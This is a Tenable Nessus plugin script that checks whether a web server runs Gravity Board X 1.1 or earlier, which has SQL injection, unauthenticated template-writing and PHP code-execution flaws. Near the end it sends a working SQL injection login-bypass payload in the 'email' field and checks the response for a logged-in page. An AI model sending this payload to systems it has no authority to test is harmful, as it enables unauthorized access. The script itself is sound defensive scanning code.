#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description) {
  script_id(19400);
  script_version("$Revision: 1.23 $");

  script_cve_id(
    "CVE-2005-2562", 
    "CVE-2005-2563", 
    "CVE-2005-2564", 
    "CVE-2005-2565"
  );
  script_bugtraq_id(14497, 14499, 14502);
  script_osvdb_id(
    18625,
    18626,
    18627,
    18628,
    18629,
    18630,
    18631,
    18632,
    18633,
    18634,
    18635
  );

  script_name(english:"Gravity Board X <= 1.1 Multiple Vulnerabilities (SQLi, XSS, PD, Cmd Exe)");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is affected by
multiple vulnerabilities." );
 script_set_attribute(attribute:"description", value:
"The remote host is running Gravity Board X, an open source, web-based
electronic forum written in PHP. 

The version of Gravity Board X installed on the remote host suffers
from several flaws, including :

  - Unauthorized Access Vulnerability
    The 'editcss.php' script does not require authentication 
    before writing user-supplied input to template files. By
    exploiting this flaw, an attacker may be able to deface
    the affected site or run arbitrary PHP code (see below).

  - SQL Injection Vulnerability
    The application does not sanitize user-supplied input to 
    the 'email' parameter of the 'index.php' script before 
    using it in database queries. By exploiting this flaw, 
    an attacker can bypass authentication and possibly 
    disclose or modify data or launch attacks against the 
    underlying database.

  - Arbitrary PHP Code Execution Vulnerability
    Using either of the two previous flaws, an attacker 
    can inject arbitrary PHP code into template files,
    which will then be executed on the remote host within 
    the context of the web server userid with each page
    view." );
 script_set_attribute(attribute:"see_also", value:"http://www.retrogod.altervista.org/gravity.html" );
 script_set_attribute(attribute:"see_also", value:"http://seclists.org/bugtraq/2005/Aug/98" );
 script_set_attribute(attribute:"solution", value:
"Unknown at this time." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:H/RL:U/RC:ND");
 script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_set_attribute(attribute:"plugin_publication_date", value: "2005/08/08");
 script_set_attribute(attribute:"vuln_publication_date", value: "2005/08/07");
 script_cvs_date("$Date: 2016/10/10 15:57:06 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_set_attribute(attribute:"cpe", value:"cpe:/a:gravity_board_x_development_team:gravity_board_x");
script_end_attributes();

 
  summary["english"] = "Checks for multiple vulnerabilities in Gravity Board X <= 1.1";
  script_summary(english:summary["english"]);
 
  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2005-2016 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/PHP");
  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("url_func.inc");


port = get_http_port(default:80, php: 1);


# Loop through CGI directories.
foreach dir (cgi_dirs()) {
  # Try to call the affected script.
  res = http_get_cache(item:string(dir, "/index.php"), port:port, exit_on_fail: 1);

  # If it looks like Gravity Board X...
  if (
    '<form method="POST" action="index.php' >< res &&
    "Gravity Board X | Powered By" >< res
  ) {
    # Try to bypass authentication.
    postdata = raw_string(
      "email=", urlencode(str:"' or isnull(1/0) --"), "&",
      "pw=", SCRIPT_NAME
    );
    w = http_send_recv3(method: "POST", item: dir+"/index.php", port: port,
      content_type: "application/x-www-form-urlencoded",
      exit_on_fail: 1, data: postdata);
    res = w[2];

    # There's a problem if we're now logged in.
    if ("href=index.php?action=logout><font class=navfont>Logout" >< res) {
      security_hole(port);
      set_kb_item(name: 'www/'+port+'/SQLInjection', value: TRUE);
      exit(0);
    }
  }
}
